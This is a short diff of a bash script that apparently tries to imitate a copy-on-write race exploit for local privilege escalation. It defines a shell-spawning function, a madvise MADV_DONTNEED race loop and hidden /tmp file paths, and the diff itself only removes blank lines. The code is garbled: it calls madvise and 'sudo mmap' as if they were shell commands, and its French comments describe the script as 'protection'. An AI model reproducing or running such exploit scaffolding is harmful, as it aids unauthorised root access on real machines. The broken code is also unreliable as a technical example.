@@ -1,5 +1,4 @@
 #!/bin/bash
-
 SHELL="/bin/sh"
 TFILE="/tmp/.X11-unix/X"
 FNAME="/tmp/baby"
@@ -12,7 +11,6 @@ sigsegv_handler() {
 spawn_shell() {
     $SHELL
 }
-
 race() {
     while [ ! $g_done ]
     do
@@ -32,7 +30,6 @@ race() {
         madvise $addr $size MADV_DONTNEED
     done
 }
-
 # Définition de la fonction pour précédente
 do_race() {
     addr=$1
@@ -50,7 +47,6 @@ do_race() {
         wait $pid
     done
 }
-
 # Lancement de la protection
 fd=$(mktemp)
 map=$(sudo mmap $fd 4096 PROT_READ MAP_PRIVATE 0)
